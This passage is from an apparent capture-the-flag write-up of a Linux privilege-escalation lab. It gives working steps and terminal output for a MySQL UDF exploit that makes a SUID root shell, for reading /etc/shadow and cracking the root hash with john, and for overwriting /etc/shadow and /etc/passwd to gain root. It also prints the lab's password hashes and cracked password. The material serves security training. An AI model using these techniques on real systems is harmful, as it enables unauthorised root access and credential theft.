style="color:#F8F8F2"><span class="token plain">create table foo(line blob);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">insert into foo values(load_file(&#x27;/home/user/tools/mysql-udf/raptor_udf2.so&#x27;));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:</p><p><code>select do_system(&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;);</code></p><p>Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:</p><p><code>/tmp/rootbash -p</code></p><p>Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">rm /tmp/rootbash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Read and follow along with the above.</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ cd /home/user/tools/mysql-udf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ ls -l</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 user user 3378 May 15 05:55 raptor_udf2.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ mysql -u root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Your MySQL connection id is 35</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Server version: 5.1.73-1+deb6u1 (Debian)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Oracle is a registered trademark of Oracle Corporation and/or its</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">affiliates. Other names may be trademarks of their respective</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">owners.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; use mysql;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Reading table information for completion of table and column names</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">You can turn off this feature to get a quicker startup with -A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Database changed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; create table foo(line blob);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Query OK, 0 rows affected (0.00 sec)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; insert into foo values(load_file(&#x27;/home/user/tools/mysql-udf/raptor_udf2.so&#x27;));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Query OK, 1 row affected (0.00 sec)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Query OK, 1 row affected (0.00 sec)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Query OK, 0 rows affected (0.00 sec)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; select do_system(&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+------------------------------------------------------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| do_system(&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;) |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+------------------------------------------------------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|                                                                0 |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+------------------------------------------------------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1 row in set (0.00 sec)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Bye</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ /tmp/rootbash -p</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rootbash-4.1# rm /tmp/rootbash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rootbash-4.1# exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="weak-file-permissions---readable-etcshadow">Weak File Permissions - Readable /etc/shadow<a href="#weak-file-permissions---readable-etcshadow" class="hash-link" aria-label="Direct link to Weak File Permissions - Readable /etc/shadow" title="Direct link to Weak File Permissions - Readable /etc/shadow">​</a></h2><p>The /etc/shadow file contains user password hashes and is usually readable only by the root user.</p><p>Note that the /etc/shadow file on the VM is world-readable:</p><p><code>ls -l /etc/shadow</code></p><p>View the contents of the /etc/shadow file:</p><p><code>cat /etc/shadow</code></p><p>Each line of the file represents a user. A user&#x27;s password hash (if they have one) can be found between the first and second colons (:) of each line.</p><p>Save the root user&#x27;s hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:</p><p><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></p><p>Switch to the root user, using the cracked password:</p><p><code>su root</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ ls -l /etc/shadow</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ cat /etc/shadow</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">daemon:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bin:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sys:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sync:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">games:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">man:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lp:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mail:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">news:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uucp:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxy:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">backup:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">list:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irc:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gnats:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nobody:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">libuuid:!:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Debian-exim:!:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sshd:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">statd:*:17299:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql:!:18133:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Using default input encoding: UTF-8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Will run 2 OpenMP threads</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">password123      (?)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1g 0:00:00:00 DONE (2020-09-30 13:21) 1.538g/s 2363p/s 2363c/s 2363C/s cuties..mexico1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Session completed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ su root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:/home/user/tools/mysql-udf# cd ~</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>What is the root user&#x27;s password hash?</li></ol><p><code>$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0</code></p><ol start="2"><li>What hashing algorithm was used to produce the root user&#x27;s password hash?</li></ol><p><code>sha512crypt</code></p><ol start="3"><li>What is the root user&#x27;s password?</li></ol><p><code>password123</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="weak-file-permissions---writable-etcshadow">Weak File Permissions - Writable /etc/shadow<a href="#weak-file-permissions---writable-etcshadow" class="hash-link" aria-label="Direct link to Weak File Permissions - Writable /etc/shadow" title="Direct link to Weak File Permissions - Writable /etc/shadow">​</a></h2><p>The /etc/shadow file contains user password hashes and is usually readable only by the root user.</p><p>Note that the /etc/shadow file on the VM is world-writable:</p><p><code>ls -l /etc/shadow</code></p><p>Generate a new password hash with a password of your choice:</p><p><code>mkpasswd -m sha-512 newpasswordhere</code></p><p>Edit the /etc/shadow file and replace the original root user&#x27;s password hash with the one you just generated.</p><p>Switch to the root user, using the new password:</p><p><code>su root</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><ol><li>Read and follow along with the above.</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ ls -l /etc/shadow</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ mkpasswd -m sha-512 newpasswordhere</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$6$a2PjThbLcYFudFW$wbNMrIVifKU/9aVvwiXc.XFDJ1l.kMEFbswTfat8wBrXiYopSnALl/WhTG.UmYY0Jf4L8Hf8vtKA3YmxGGSpy1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ cat /etc/shadow</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:$6$a2PjThbLcYFudFW$wbNMrIVifKU/9aVvwiXc.XFDJ1l.kMEFbswTfat8wBrXiYopSnALl/WhTG.UmYY0Jf4L8Hf8vtKA3YmxGGSpy1:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">daemon:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bin:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sys:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sync:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">games:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">man:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lp:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mail:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">news:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uucp:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxy:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">backup:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">list:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irc:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gnats:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nobody:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">libuuid:!:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Debian-exim:!:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sshd:*:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">statd:*:17299:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql:!:18133:0:99999:7:::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ su root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:/home/user/tools/mysql-udf# cd ~</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~# exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="weak-file-permissions---writable-etcpasswd">Weak File Permissions - Writable /etc/passwd<a href="#weak-file-permissions---writable-etcpasswd" class="hash-link" aria-label="Direct link to Weak File Permissions - Writable /etc/passwd" title="Direct link to Weak File Permissions - Writable /etc/passwd">​</a></h2><p>The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.</p><p>Note that the /etc/passwd file is world-writable:</p><p><code>ls -l /etc/passwd</code></p><p>Generate a new password hash with a password of your choice:</p><p><code>openssl passwd newpasswordhere</code></p><p>Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user&#x27;s row (replacing the &quot;x&quot;).</p><p>Switch to the root user, using the new password:</p><p><code>su root</code></p><p>Alternatively, copy the root user&#x27;s row and append it to the bottom of the file, changing the first instance of the word &quot;root&quot; to &quot;newroot&quot; and placing the generated password hash between the first and second colon (replacing the &quot;x&quot;).</p><p>Now switch to the newroot user, using the new password:</p><p><code>su newroot</code></p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span 